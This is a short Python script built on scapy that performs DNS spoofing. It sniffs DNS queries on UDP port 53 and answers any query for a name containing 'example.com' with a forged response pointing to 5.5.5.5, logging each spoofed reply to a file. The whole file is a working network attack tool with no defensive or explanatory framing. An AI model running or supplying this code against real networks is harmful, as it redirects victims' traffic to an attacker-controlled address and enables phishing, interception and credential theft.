import scapy.all as scapy
import logging

logging.basicConfig(filename='dns_spoof.log', level=logging.INFO,
                    format='%(asctime)s - %(message)s')

def spoof_dns(packet):
    if packet.haslayer(scapy.DNSQR):
        qname = packet[scapy.DNSQR].qname
        if b"example.com" in qname:
            spoofed_pkt = scapy.IP(dst=packet[scapy.IP].src, src=packet[scapy.IP].dst) / \
                          scapy.UDP(dport=packet[scapy.UDP].sport, sport=packet[scapy.UDP].dport) / \
                          scapy.DNS(id=packet[scapy.DNS].id, qr=1, aa=1, qd=packet[scapy.DNS].qd, 
                                    an=scapy.DNSRR(rrname=qname, rdata="5.5.5.5"))
            scapy.send(spoofed_pkt, verbose=0)
            logging.info(f"Spoofing DNS response for {qname} to IP 5.5.5.5")
            print(f"Sent spoofed DNS response for {qname}")

scapy.sniff(filter="udp port 53", store=False, prn=spoof_dns)
